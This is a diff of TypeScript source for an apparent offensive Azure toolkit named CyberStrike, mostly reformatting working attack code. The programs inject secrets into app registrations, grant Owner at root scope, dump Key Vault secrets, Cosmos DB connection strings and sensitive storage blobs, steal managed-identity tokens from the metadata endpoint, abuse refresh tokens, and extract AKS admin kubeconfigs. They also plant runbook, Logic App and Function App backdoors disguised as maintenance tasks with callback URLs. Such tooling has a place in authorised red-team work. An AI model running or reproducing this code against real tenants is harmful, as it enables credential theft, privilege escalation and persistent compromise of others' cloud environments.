@@ -31,8 +31,7 @@ const PROGRAMS = {
     args: "--automation-account NAME --resource-group RG [--callback-url URL]",
   },
   azuread_token: {
-    description:
-      "Manipulate Azure AD tokens: refresh token exchange for new scopes, FOCI (Family of Client IDs) abuse",
+    description: "Manipulate Azure AD tokens: refresh token exchange for new scopes, FOCI (Family of Client IDs) abuse",
     args: "--action <refresh|foci> [--refresh-token TOKEN] [--client-id ID]",
   },
   cosmos_dump: {
@@ -63,12 +62,25 @@ const PROGRAMS = {
 } as const satisfies Record<string, { description: string; args: string }>
 
 type Program = keyof typeof PROGRAMS
-type Finding = { checkId: string; provider: string; severity: string; status: string; resource: string; title: string; details: string; remediation: string }
+type Finding = {
+  checkId: string
+  provider: string
+  severity: string
+  status: string
+  resource: string
+  title: string
+  details: string
+  remediation: string
+}
 type HookResult = { output: string; findings: Finding[] }
 
 // ── CLI helpers ──
 
-async function run(cmd: string, args: string[], timeout: number): Promise<{ stdout: string; stderr: string; exitCode: number }> {
+async function run(
+  cmd: string,
+  args: string[],
+  timeout: number,
+): Promise<{ stdout: string; stderr: string; exitCode: number }> {
   const proc = Bun.spawn([cmd, ...args], { stdout: "pipe", stderr: "pipe", env: { ...process.env } })
   const timer = setTimeout(() => proc.kill(), timeout * 1000)
   const [stdout, stderr] = await Promise.all([new Response(proc.stdout).text(), new Response(proc.stderr).text()])
@@ -91,7 +103,11 @@ function hasFlag(args: string[], flag: string): boolean {
 }
 
 function tryJson(s: string) {
-  try { return JSON.parse(s) } catch { return null }
+  try {
+    return JSON.parse(s)
+  } catch {
+    return null
+  }
 }
 
 // ── Program implementations ──
@@ -106,7 +122,19 @@ async function entraEnum(args: string[], timeout: number): Promise<HookResult> {
   const account = tryJson(acct.stdout)
   output.push(`[*] Tenant: ${account?.tenantId}`, `[*] Subscription: ${account?.name} (${account?.id})\n`)
 
-  const users = await run("az", ["ad", "user", "list", "--query", "[].{name:displayName,upn:userPrincipalName,enabled:accountEnabled}", "-o", "json"], timeout)
+  const users = await run(
+    "az",
+    [
+      "ad",
+      "user",
+      "list",
+      "--query",
+      "[].{name:displayName,upn:userPrincipalName,enabled:accountEnabled}",
+      "-o",
+      "json",
+    ],
+    timeout,
+  )
   if (users.exitCode === 0) {
     const ul = tryJson(users.stdout) || []
     output.push(`[+] Users: ${ul.length}`)
@@ -114,25 +142,62 @@ async function entraEnum(args: string[], timeout: number): Promise<HookResult> {
     if (ul.length > 20) output.push(`    ... and ${ul.length - 20} more`)
   }
 
-  const sps = await run("az", ["ad", "sp", "list", "--all", "--query", "[].{name:displayName,appId:appId,type:servicePrincipalType}", "-o", "json"], timeout)
+  const sps = await run(
+    "az",
+    [
+      "ad",
+      "sp",
+      "list",
+      "--all",
+      "--query",
+      "[].{name:displayName,appId:appId,type:servicePrincipalType}",
+      "-o",
+      "json",
+    ],
+    timeout,
+  )
   if (sps.exitCode === 0) {
     const sl = tryJson(sps.stdout) || []
     output.push(`[+] Service Principals: ${sl.length}`)
   }
 
-  const roles = await az(["role", "assignment", "list", "--all", "--query", "[].{principal:principalName,role:roleDefinitionName,scope:scope}"], sub, timeout)
+  const roles = await az(
+    [
+      "role",
+      "assignment",
+      "list",
+      "--all",
+      "--query",
+      "[].{principal:principalName,role:roleDefinitionName,scope:scope}",
+    ],
+    sub,
+    timeout,
+  )
   if (roles.exitCode === 0) {
     const rl = tryJson(roles.stdout) || []
     output.push(`[+] Role Assignments: ${rl.length}`)
     const dangerous = ["Owner", "Contributor", "User Access Administrator"]
     for (const r of rl) {
       if (dangerous.includes(r.role)) {
-        findings.push({ checkId: "AZURE-ENUM-001", provider: "azure", severity: r.role === "Owner" ? "critical" : "high", status: "FAIL", resource: r.principal || "unknown", title: `Dangerous role: ${r.role}`, details: `${r.principal} has ${r.role} at ${r.scope}`, remediation: "Use least-privilege custom roles" })
+        findings.push({
+          checkId: "AZURE-ENUM-001",
+          provider: "azure",
+          severity: r.role === "Owner" ? "critical" : "high",
+          status: "FAIL",
+          resource: r.principal || "unknown",
+          title: `Dangerous role: ${r.role}`,
+          details: `${r.principal} has ${r.role} at ${r.scope}`,
+          remediation: "Use least-privilege custom roles",
+        })
       }
     }
   }
 
-  const apps = await run("az", ["ad", "app", "list", "--query", "[].{name:displayName,appId:appId}", "-o", "json"], timeout)
+  const apps = await run(
+    "az",
+    ["ad", "app", "list", "--query", "[].{name:displayName,appId:appId}", "-o", "json"],
+    timeout,
+  )
   if (apps.exitCode === 0) {
     const al = tryJson(apps.stdout) || []
     output.push(`[+] App Registrations: ${al.length}`)
@@ -151,23 +216,40 @@ async function entraPrivesc(args: string[], timeout: number): Promise<HookResult
     const r = await run("az", ["ad", "app", "credential", "reset", "--id", targetId, "--append", "-o", "json"], timeout)
     if (r.exitCode === 0) {
       const cred = tryJson(r.stdout)
-      return { output: `[+] Secret injected into app ${targetId}\n    appId: ${cred?.appId}\n    password: ${cred?.password}\n    tenant: ${cred?.tenant}`, findings: [] }
+      return {
+        output: `[+] Secret injected into app ${targetId}\n    appId: ${cred?.appId}\n    password: ${cred?.password}\n    tenant: ${cred?.tenant}`,
+        findings: [],
+      }
     }
     return { output: `[-] Failed: ${r.stderr.trim()}`, findings: [] }
   }
 
   if (method === "role_assign") {
     if (!targetId) return { output: "ERROR: --target-id (principal ID) required for role_assign", findings: [] }
-    const r = await run("az", ["role", "assignment", "create", "--assignee", targetId, "--role", "Owner", "--scope", "/", "-o", "json"], timeout)
+    const r = await run(
+      "az",
+      ["role", "assignment", "create", "--assignee", targetId, "--role", "Owner", "--scope", "/", "-o", "json"],
+      timeout,
+    )
     if (r.exitCode === 0) return { output: `[+] Owner role assigned to ${targetId}`, findings: [] }
     return { output: `[-] Failed: ${r.stderr.trim()}`, findings: [] }
   }
 
   if (method === "consent_grant") {
-    const apps = await run("az", ["ad", "app", "list", "--query", "[].{id:id,name:displayName,appId:appId}", "-o", "json"], timeout)
+    const apps = await run(
+      "az",
+      ["ad", "app", "list", "--query", "[].{id:id,name:displayName,appId:appId}", "-o", "json"],
+      timeout,
+    )
     if (apps.exitCode !== 0) return { output: `[-] Cannot list apps: ${apps.stderr.trim()}`, findings: [] }
     const al = tryJson(apps.stdout) || []
-    return { output: [`[*] ${al.length} app registration(s) — review for consent grant targets:`, ...al.slice(0, 10).map((a: { name: string; appId: string }) => `    ${a.name} (${a.appId})`)].join("\n"), findings: [] }
+    return {
+      output: [
+        `[*] ${al.length} app registration(s) — review for consent grant targets:`,
+        ...al.slice(0, 10).map((a: { name: string; appId: string }) => `    ${a.name} (${a.appId})`),
+      ].join("\n"),
+      findings: [],
+    }
   }
 
   return { output: `ERROR: Unknown method: ${method}`, findings: [] }
@@ -185,8 +267,13 @@ async function keyvaultDump(args: string[], timeout: number): Promise<HookResult
       output.push(`[+] Secrets: ${sl.length}`)
       for (const s of sl) {
         const name = s.id?.split("/").pop() || s.name
-        const val = await run("az", ["keyvault", "secret", "show", "--vault-name", vaultName, "--name", name, "--query", "value", "-o", "tsv"], timeout)
-        if (val.exitCode === 0) output.push(`[+] ${name}: ${val.stdout.trim().slice(0, 80)}${val.stdout.length > 80 ? "..." : ""}`)
+        const val = await run(
+          "az",
+          ["keyvault", "secret", "show", "--vault-name", vaultName, "--name", name, "--query", "value", "-o", "tsv"],
+          timeout,
+        )
+        if (val.exitCode === 0)
+          output.push(`[+] ${name}: ${val.stdout.trim().slice(0, 80)}${val.stdout.length > 80 ? "..." : ""}`)
         else output.push(`[-] ${name}: access denied`)
       }
     }
@@ -217,15 +304,52 @@ async function storageDump(args: string[], timeout: number): Promise<HookResult>
   const sensitivePattern = pattern || "\\.(env|pem|key|p12|pfx|sql|bak)$|credentials|secret|password|backup"
 
   if (accountName && container) {
-    const r = await run("az", ["storage", "blob", "list", "--account-name", accountName, "--container-name", container, "--query", "[].name", "-o", "json"], timeout)
+    const r = await run(
+      "az",
+      [
+        "storage",
+        "blob",
+        "list",
+        "--account-name",
+        accountName,
+        "--container-name",
+        container,
+        "--query",
+        "[].name",
+        "-o",
+        "json",
+      ],
+      timeout,
+    )
     if (r.exitCode !== 0) return { output: `[-] Cannot list blobs: ${r.stderr.trim()}`, findings: [] }
     const blobs = (tryJson(r.stdout) || []) as string[]
-    const sensitive = blobs.filter(b => new RegExp(sensitivePattern, "i").test(b))
-    const output = [`[*] Container: ${accountName}/${container}`, `[+] Total blobs: ${blobs.length}`, `[+] Sensitive: ${sensitive.length}`]
+    const sensitive = blobs.filter((b) => new RegExp(sensitivePattern, "i").test(b))
+    const output = [
+      `[*] Container: ${accountName}/${container}`,
+      `[+] Total blobs: ${blobs.length}`,
+      `[+] Sensitive: ${sensitive.length}`,
+    ]
     for (const b of sensitive) output.push(`    ${b}`)
     if (download && sensitive.length > 0) {
       for (const b of sensitive.slice(0, 10)) {
-        const dl = await run("az", ["storage", "blob", "download", "--account-name", accountName, "--container-name", container, "--name", b, "--file", `./blob_loot/${b.split("/").pop()}`, "--no-progress"], timeout)
+        const dl = await run(
+          "az",
+          [
+            "storage",
+            "blob",
+            "download",
+            "--account-name",
+            accountName,
+            "--container-name",
+            container,
+            "--name",
+            b,
+            "--file",
+            `./blob_loot/${b.split("/").pop()}`,
+            "--no-progress",
+          ],
+          timeout,
+        )
         output.push(dl.exitCode === 0 ? `    Downloaded: ${b}` : `    Failed: ${b}`)
       }
     }
@@ -233,7 +357,21 @@ async function storageDump(args: string[], timeout: number): Promise<HookResult>
   }
 
   if (accountName) {
-    const r = await run("az", ["storage", "container", "list", "--account-name", accountName, "--query", "[].{name:name,access:properties.publicAccess}", "-o", "json"], timeout)
+    const r = await run(
+      "az",
+      [
+        "storage",
+        "container",
+        "list",
+        "--account-name",
+        accountName,
+        "--query",
+        "[].{name:name,access:properties.publicAccess}",
+        "-o",
+        "json",
+      ],
+      timeout,
+    )
     if (r.exitCode !== 0) return { output: `[-] Cannot list containers: ${r.stderr.trim()}`, findings: [] }
     const containers = tryJson(r.stdout) || []
     const output = [`[*] Storage account: ${accountName}`, `[+] Containers: ${containers.length}`]
@@ -241,7 +379,11 @@ async function storageDump(args: string[], timeout: number): Promise<HookResult>
     return { output: output.join("\n"), findings: [] }
   }
 
-  const accts = await run("az", ["storage", "account", "list", "--query", "[].{name:name,rg:resourceGroup}", "-o", "json"], timeout)
+  const accts = await run(
+    "az",
+    ["storage", "account", "list", "--query", "[].{name:name,rg:resourceGroup}", "-o", "json"],
+    timeout,
+  )
   if (accts.exitCode !== 0) return { output: `[-] Cannot list storage accounts: ${accts.stderr.trim()}`, findings: [] }
   const al = tryJson(accts.stdout) || []
   const output = [`[*] Found ${al.length} storage account(s)\n`]
@@ -254,10 +396,13 @@ async function managedIdentity(args: string[]): Promise<HookResult> {
   const output: string[] = ["[*] Probing Azure IMDS for managed identity...\n"]
 
   try {
-    const resp = await fetch(`http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=${encodeURIComponent(resource)}`, {
-      headers: { Metadata: "true" },
-      signal: AbortSignal.timeout(5000),
-    })
+    const resp = await fetch(
+      `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=${encodeURIComponent(resource)}`,
+      {
+        headers: { Metadata: "true" },
+        signal: AbortSignal.timeout(5000),
+      },
+    )
     if (!resp.ok) {
       output.push(`[-] Token request failed: HTTP ${resp.status}`)
       return { output: output.join("\n"), findings: [] }
@@ -289,7 +434,11 @@ async function managedIdentity(args: string[]): Promise<HookResult> {
 async function cleanupAzure(args: string[], timeout: number): Promise<HookResult> {
   const sub = argVal(args, "--subscription-id")
   const dryRun = args.includes("--dry-run")
-  const output: string[] = [dryRun ? "[*] CLEANUP DRY RUN — no changes will be made\n" : "[*] Cleaning up CyberStrike artifacts from Azure...\n"]
+  const output: string[] = [
+    dryRun
+      ? "[*] CLEANUP DRY RUN — no changes will be made\n"
+      : "[*] Cleaning up CyberStrike artifacts from Azure...\n",
+  ]
   let cleaned = 0
 
   output.push("[*] Checking for CyberStrike automation runbooks (cs-* prefix)...")
@@ -297,7 +446,11 @@ async function cleanupAzure(args: string[], timeout: number): Promise<HookResult
   if (accts.exitCode === 0) {
     const accounts = JSON.parse(accts.stdout)
     for (const a of accounts) {
-      const rbs = await az(["automation", "runbook", "list", "--automation-account-name", a.name, "--resource-group", a.resourceGroup], sub, timeout)
+      const rbs = await az(
+        ["automation", "runbook", "list", "--automation-account-name", a.name, "--resource-group", a.resourceGroup],
+        sub,
+        timeout,
+      )
       if (rbs.exitCode !== 0) continue
       const runbooks = JSON.parse(rbs.stdout)
       for (const r of runbooks) {
@@ -305,8 +458,27 @@ async function cleanupAzure(args: string[], timeout: number): Promise<HookResult
         if (dryRun) {
           output.push(`    [DRY] Would delete runbook: ${r.name} in ${a.name}`)
         } else {
-          const del = await az(["automation", "runbook", "delete", "--automation-account-name", a.name, "--resource-group", a.resourceGroup, "--name", r.name, "--yes"], sub, timeout)
-          output.push(del.exitCode === 0 ? `    [+] Deleted runbook: ${r.name}` : `    [-] Failed to delete ${r.name}: ${del.stderr.slice(0, 100)}`)
+          const del = await az(
+            [
+              "automation",
+              "runbook",
+              "delete",
+              "--automation-account-name",
+              a.name,
+              "--resource-group",
+              a.resourceGroup,
+              "--name",
+              r.name,
+              "--yes",
+            ],
+            sub,
+            timeout,
+          )
+          output.push(
+            del.exitCode === 0
+              ? `    [+] Deleted runbook: ${r.name}`
+              : `    [-] Failed to delete ${r.name}: ${del.stderr.slice(0, 100)}`,
+          )
         }
         cleaned++
       }
@@ -324,7 +496,11 @@ async function cleanupAzure(args: string[], timeout: number): Promise<HookResult
         output.push(`    [DRY] Would remove role assignment: ${r.roleDefinitionName} on ${r.principalName}`)
       } else {
         const del = await az(["role", "assignment", "delete", "--ids", r.id], sub, timeout)
-        output.push(del.exitCode === 0 ? `    [+] Removed: ${r.roleDefinitionName} on ${r.principalName}` : `    [-] Failed: ${del.stderr.slice(0, 100)}`)
+        output.push(
+          del.exitCode === 0
+            ? `    [+] Removed: ${r.roleDefinitionName} on ${r.principalName}`
+            : `    [-] Failed: ${del.stderr.slice(0, 100)}`,
+        )
       }
       cleaned++
     }
@@ -340,7 +516,9 @@ async function cleanupAzure(args: string[], timeout: number): Promise<HookResult
         output.push(`    [DRY] Would delete app registration: ${a.displayName} (${a.appId})`)
       } else {
         const del = await az(["ad", "app", "delete", "--id", a.appId], sub, timeout)
-        output.push(del.exitCode === 0 ? `    [+] Deleted app: ${a.displayName}` : `    [-] Failed: ${del.stderr.slice(0, 100)}`)
+        output.push(
+          del.exitCode === 0 ? `    [+] Deleted app: ${a.displayName}` : `    [-] Failed: ${del.stderr.slice(0, 100)}`,
+        )
       }
       cleaned++
     }
@@ -379,7 +557,12 @@ async function azureadToken(args: string[], timeout: number): Promise<HookResult
     output.push(`    Tenant: ${acct.tenantId}`)
   }
 
-  const resources = ["https://management.azure.com", "https://vault.azure.net", "https://storage.azure.com", "https://database.windows.net"]
+  const resources = [
+    "https://management.azure.com",
+    "https://vault.azure.net",
+    "https://storage.azure.com",
+    "https://database.windows.net",
+  ]
   output.push("\n[*] Probing additional resource tokens...")
   for (const r of resources) {
     if (r === resource) continue
@@ -410,7 +593,11 @@ async function runbookBackdoor(args: string[], timeout: number): Promise<HookRes
     output.push(`[+] Found ${accounts.length} automation account(s)`)
     for (const a of accounts) {
       output.push(`    ${a.name} (${a.resourceGroup}) — state: ${a.state}`)
-      const rbs = await az(["automation", "runbook", "list", "--automation-account-name", a.name, "--resource-group", a.resourceGroup], sub, timeout)
+      const rbs = await az(
+        ["automation", "runbook", "list", "--automation-account-name", a.name, "--resource-group", a.resourceGroup],
+        sub,
+        timeout,
+      )
       if (rbs.exitCode === 0) {
         const runbooks = JSON.parse(rbs.stdout)
         output.push(`      Runbooks: ${runbooks.length}`)
@@ -421,7 +608,9 @@ async function runbookBackdoor(args: string[], timeout: number): Promise<HookRes
   }
 
   if (!automationAccount || !resourceGroup) {
-    output.push("[-] --automation-account and --resource-group required for inject/create. Use --method list to find them.")
+    output.push(
+      "[-] --automation-account and --resource-group required for inject/create. Use --method list to find them.",
+    )
     return { output: output.join("\n"), findings: [] }
   }
 
@@ -446,14 +635,25 @@ $req.GetResponse() | Out-Null
 
   if (method === "create") {
     output.push(`[*] Creating runbook ${runbookName}...`)
-    const create = await az([
-      "automation", "runbook", "create",
-      "--automation-account-name", automationAccount,
-      "--resource-group", resourceGroup,
-      "--name", runbookName,
-      "--type", "PowerShell",
-      "--description", "Maintenance task",
-    ], sub, timeout)
+    const create = await az(
+      [
+        "automation",
+        "runbook",
+        "create",
+        "--automation-account-name",
+        automationAccount,
+        "--resource-group",
+        resourceGroup,
+        "--name",
+        runbookName,
+        "--type",
+        "PowerShell",
+        "--description",
+        "Maintenance task",
+      ],
+      sub,
+      timeout,
+    )
     if (create.exitCode !== 0) {
       output.push(`[-] Create failed: ${create.stderr.slice(0, 200)}`)
       return { output: output.join("\n"), findings: [] }
@@ -464,37 +664,65 @@ $req.GetResponse() | Out-Null
   output.push(`[*] Replacing runbook content with payload...`)
   const tmpFile = `/tmp/cs-runbook-${Date.now()}.ps1`
   await Bun.write(tmpFile, payload)
-  const replace = await az([
-    "automation", "runbook", "replace-content",
-    "--automation-account-name", automationAccount,
-    "--resource-group", resourceGroup,
-    "--name", runbookName,
-    "--content", `@${tmpFile}`,
-  ], sub, timeout)
+  const replace = await az(
+    [
+      "automation",
+      "runbook",
+      "replace-content",
+      "--automation-account-name",
+      automationAccount,
+      "--resource-group",
+      resourceGroup,
+      "--name",
+      runbookName,
+      "--content",
+      `@${tmpFile}`,
+    ],
+    sub,
+    timeout,
+  )
   if (replace.exitCode !== 0) {
     output.push(`[-] Content replace failed: ${replace.stderr.slice(0, 200)}`)
     return { output: output.join("\n"), findings: [] }
   }
   output.push("[+] Payload injected")
 
-  const publish = await az([
-    "automation", "runbook", "publish",
-    "--automation-account-name", automationAccount,
-    "--resource-group", resourceGroup,
-    "--name", runbookName,
-  ], sub, timeout)
+  const publish = await az(
+    [
+      "automation",
+      "runbook",
+      "publish",
+      "--automation-account-name",
+      automationAccount,
+      "--resource-group",
+      resourceGroup,
+      "--name",
+      runbookName,
+    ],
+    sub,
+    timeout,
+  )
   if (publish.exitCode !== 0) {
     output.push(`[-] Publish failed: ${publish.stderr.slice(0, 200)}`)
     return { output: output.join("\n"), findings: [] }
   }
   output.push("[+] Runbook published")
 
-  const start = await az([
-    "automation", "runbook", "start",
-    "--automation-account-name", automationAccount,
-    "--resource-group", resourceGroup,
-    "--name", runbookName,
-  ], sub, timeout)
+  const start = await az(
+    [
+      "automation",
+      "runbook",
+      "start",
+      "--automation-account-name",
+      automationAccount,
+      "--resource-group",
+      resourceGroup,
+      "--name",
+      runbookName,
+    ],
+    sub,
+    timeout,
+  )
   output.push(start.exitCode === 0 ? "[+] Runbook started" : `[-] Start failed: ${start.stderr.slice(0, 200)}`)
 
   return { output: output.join("\n"), findings: [] }
@@ -510,7 +738,11 @@ async function cosmosDump(args: string[], timeout: number): Promise<HookResult> 
   const output: string[] = ["[*] Azure Cosmos DB enumeration and extraction...\n"]
 
   if (!account) {
-    const list = await az(["cosmosdb", "list", "--query", "[].{name:name,rg:resourceGroup,kind:kind,location:location}"], undefined, timeout)
+    const list = await az(
+      ["cosmosdb", "list", "--query", "[].{name:name,rg:resourceGroup,kind:kind,location:location}"],
+      undefined,
+      timeout,
+    )
     if (list.exitCode === 0) {
       const accounts = tryJson(list.stdout) || []
       output.push(`[+] Cosmos DB accounts: ${accounts.length}`)
@@ -539,17 +771,41 @@ async function cosmosDump(args: string[], timeout: number): Promise<HookResult> 
     }
   }
 
-  const connStr = await az(["cosmosdb", "keys", "list", "--name", account, "--type", "connection-strings"], undefined, timeout)
+  const connStr = await az(
+    ["cosmosdb", "keys", "list", "--name", account, "--type", "connection-strings"],
+    undefined,
+    timeout,
+  )
   if (connStr.exitCode === 0) {
     const cs = tryJson(connStr.stdout)
     if (cs?.connectionStrings?.length) {
       output.push(`\n[+] Connection strings: ${cs.connectionStrings.length}`)
-      for (const c of cs.connectionStrings) output.push(`    ${c.description}: ${String(c.connectionString).substring(0, 60)}...`)
+      for (const c of cs.connectionStrings)
+        output.push(`    ${c.description}: ${String(c.connectionString).substring(0, 60)}...`)
     }
   }
 
   if (database && container && query) {
-    const q = await az(["cosmosdb", "sql", "container", "run-query", "--name", container, "--database-name", database, "--account-name", account, "--query", query, "--max-item-count", maxItems], undefined, timeout)
+    const q = await az(
+      [
+        "cosmosdb",
+        "sql",
+        "container",
+        "run-query",
+        "--name",
+        container,
+        "--database-name",
+        database,
+        "--account-name",
+        account,
+        "--query",
+        query,
+        "--max-item-count",
+        maxItems,
+      ],
+      undefined,
+      timeout,
+    )
     if (q.exitCode === 0) {
       output.push(`\n[+] Query results:\n${q.stdout.substring(0, 5000)}`)
       findings.push({
@@ -566,7 +822,11 @@ async function cosmosDump(args: string[], timeout: number): Promise<HookResult> 
   }
 
   if (database && !container) {
-    const containers = await az(["cosmosdb", "sql", "container", "list", "--account-name", account, "--database-name", database], undefined, timeout)
+    const containers = await az(
+      ["cosmosdb", "sql", "container", "list", "--account-name", account, "--database-name", database],
+      undefined,
+      timeout,
+    )
     if (containers.exitCode === 0) {
       const items = tryJson(containers.stdout) || []
       output.push(`\n[+] Containers in ${database}: ${items.length}`)
@@ -593,11 +853,21 @@ async function aksEnum(args: string[], timeout: number): Promise<HookResult> {
   const output: string[] = ["[*] Azure Kubernetes Service enumeration...\n"]
 
   if (!cluster) {
-    const list = await az(["aks", "list", "--query", "[].{name:name,rg:resourceGroup,k8sVersion:kubernetesVersion,powerState:powerState.code,nodeCount:agentPoolProfiles[0].count}"], undefined, timeout)
+    const list = await az(
+      [
+        "aks",
+        "list",
+        "--query",
+        "[].{name:name,rg:resourceGroup,k8sVersion:kubernetesVersion,powerState:powerState.code,nodeCount:agentPoolProfiles[0].count}",
+      ],
+      undefined,
+      timeout,
+    )
     if (list.exitCode === 0) {
       const clusters = tryJson(list.stdout) || []
       output.push(`[+] AKS clusters: ${clusters.length}`)
-      for (const c of clusters) output.push(`    ${c.name} (k8s ${c.k8sVersion}) — rg: ${c.rg}, nodes: ${c.nodeCount}, state: ${c.powerState}`)
+      for (const c of clusters)
+        output.push(`    ${c.name} (k8s ${c.k8sVersion}) — rg: ${c.rg}, nodes: ${c.nodeCount}, state: ${c.powerState}`)
       findings.push({
         checkId: "AZ-AKS-001",
         provider: "azure",
@@ -638,14 +908,32 @@ async function aksEnum(args: string[], timeout: number): Promise<HookResult> {
     }
   }
 
-  const nodePools = await az(["aks", "nodepool", "list", "--cluster-name", cluster, ...(rg ? ["--resource-group", rg] : [])], undefined, timeout)
+  const nodePools = await az(
+    ["aks", "nodepool", "list", "--cluster-name", cluster, ...(rg ? ["--resource-group", rg] : [])],
+    undefined,
+    timeout,
+  )
   if (nodePools.exitCode === 0) {
     const pools = tryJson(nodePools.stdout) || []
     output.push(`\n[+] Node pools: ${pools.length}`)
     for (const p of pools) output.push(`    ${p.name}: ${p.count} nodes, VM: ${p.vmSize}, OS: ${p.osType}`)
   }
 
-  const creds = await az(["aks", "get-credentials", "--name", cluster, ...(rg ? ["--resource-group", rg] : []), "--admin", "--overwrite-existing", "-f", `/tmp/cs-aks-${cluster}-kubeconfig`], undefined, timeout)
+  const creds = await az(
+    [
+      "aks",
+      "get-credentials",
+      "--name",
+      cluster,
+      ...(rg ? ["--resource-group", rg] : []),
+      "--admin",
+      "--overwrite-existing",
+      "-f",
+      `/tmp/cs-aks-${cluster}-kubeconfig`,
+    ],
+    undefined,
+    timeout,
+  )
   if (creds.exitCode === 0) {
     output.push(`\n[+] Admin kubeconfig extracted to /tmp/cs-aks-${cluster}-kubeconfig`)
     output.push(`    Use: export KUBECONFIG=/tmp/cs-aks-${cluster}-kubeconfig`)
@@ -679,7 +967,8 @@ async function logicAppBackdoor(args: string[], timeout: number): Promise<HookRe
   if (method === "create") {
     const definition = JSON.stringify({
       definition: {
-        "$schema": "https://schema.management.azure.com/providers/Microsoft.Logic/schemas/2016-06-01/workflowdefinition.json#",
+        $schema:
+          "https://schema.management.azure.com/providers/Microsoft.Logic/schemas/2016-06-01/workflowdefinition.json#",
         contentVersion: "1.0.0.0",
         triggers: {
           manual: {
@@ -698,10 +987,18 @@ async function logicAppBackdoor(args: string[], timeout: number): Promise<HookRe
       },
     })
 
-    const create = await az(["logic", "workflow", "create", "--resource-group", rgName, "--name", `cs-${name}`, "--definition", definition], undefined, timeout)
+    const create = await az(
+      ["logic", "workflow", "create", "--resource-group", rgName, "--name", `cs-${name}`, "--definition", definition],
+      undefined,
+      timeout,
+    )
     if (create.exitCode === 0) {
       output.push(`[+] Logic App created: cs-${name}`)
-      const triggerUrl = await az(["logic", "workflow", "show", "--resource-group", rgName, "--name", `cs-${name}`, "--query", "accessEndpoint"], undefined, timeout)
+      const triggerUrl = await az(
+        ["logic", "workflow", "show", "--resource-group", rgName, "--name", `cs-${name}`, "--query", "accessEndpoint"],
+        undefined,
+        timeout,
+      )
       if (triggerUrl.exitCode === 0) output.push(`[+] Trigger URL: ${triggerUrl.stdout.trim()}`)
       findings.push({
         checkId: "AZ-LOGIC-001",
@@ -745,16 +1042,56 @@ async function functionAppBackdoor(args: string[], timeout: number): Promise<Hoo
 
   if (method === "create") {
     const storageName = `csstore${Date.now().toString(36)}`
-    const createStorage = await az(["storage", "account", "create", "--name", storageName, "--resource-group", rgName, "--sku", "Standard_LRS"], undefined, timeout)
+    const createStorage = await az(
+      ["storage", "account", "create", "--name", storageName, "--resource-group", rgName, "--sku", "Standard_LRS"],
+      undefined,
+      timeout,
+    )
     if (createStorage.exitCode !== 0) {
       output.push(`[!] Storage account creation failed: ${createStorage.stderr.trim()}`)
       return { output: output.join("\n"), findings }
     }
 
-    const createFunc = await az(["functionapp", "create", "--resource-group", rgName, "--name", `cs-${name}`, "--storage-account", storageName, "--consumption-plan-location", "eastus", "--runtime", "node", "--runtime-version", "18", "--functions-version", "4"], undefined, timeout)
+    const createFunc = await az(
+      [
+        "functionapp",
+        "create",
+        "--resource-group",
+        rgName,
+        "--name",
+        `cs-${name}`,
+        "--storage-account",
+        storageName,
+        "--consumption-plan-location",
+        "eastus",
+        "--runtime",
+        "node",
+        "--runtime-version",
+        "18",
+        "--functions-version",
+        "4",
+      ],
+      undefined,
+      timeout,
+    )
     if (createFunc.exitCode === 0) {
       output.push(`[+] Function App created: cs-${name}`)
-      await az(["functionapp", "config", "appsettings", "set", "--resource-group", rgName, "--name", `cs-${name}`, "--settings", `CALLBACK_URL=${callbackUrl}`], undefined, timeout)
+      await az(
+        [
+          "functionapp",
+          "config",
+          "appsettings",
+          "set",
+          "--resource-group",
+          rgName,
+          "--name",
+          `cs-${name}`,
+          "--settings",
+          `CALLBACK_URL=${callbackUrl}`,
+        ],
+        undefined,
+        timeout,
+      )
 
       if (trigger === "http") {
         output.push(`[+] HTTP trigger configured — callback: ${callbackUrl}`)
@@ -784,9 +1121,26 @@ async function functionAppBackdoor(args: string[], timeout: number): Promise<Hoo
     if (show.exitCode === 0) {
       const info = tryJson(show.stdout)
       output.push(`[+] Existing Function App: ${name}`)
-      output.push(`    Runtime: ${info?.siteConfig?.linuxFxVersion || info?.siteConfig?.netFrameworkVersion || "unknown"}`)
+      output.push(
+        `    Runtime: ${info?.siteConfig?.linuxFxVersion || info?.siteConfig?.netFrameworkVersion || "unknown"}`,
+      )
       output.push(`    State: ${info?.state}`)
-      await az(["functionapp", "config", "appsettings", "set", "--resource-group", rgName, "--name", name, "--settings", `CALLBACK_URL=${callbackUrl}`], undefined, timeout)
+      await az(
+        [
+          "functionapp",
+          "config",
+          "appsettings",
+          "set",
+          "--resource-group",
+          rgName,
+          "--name",
+          name,
+          "--settings",
+          `CALLBACK_URL=${callbackUrl}`,
+        ],
+        undefined,
+        timeout,
+      )
       output.push(`[+] Injected CALLBACK_URL env var into ${name}`)
       findings.push({
         checkId: "AZ-FUNC-002",
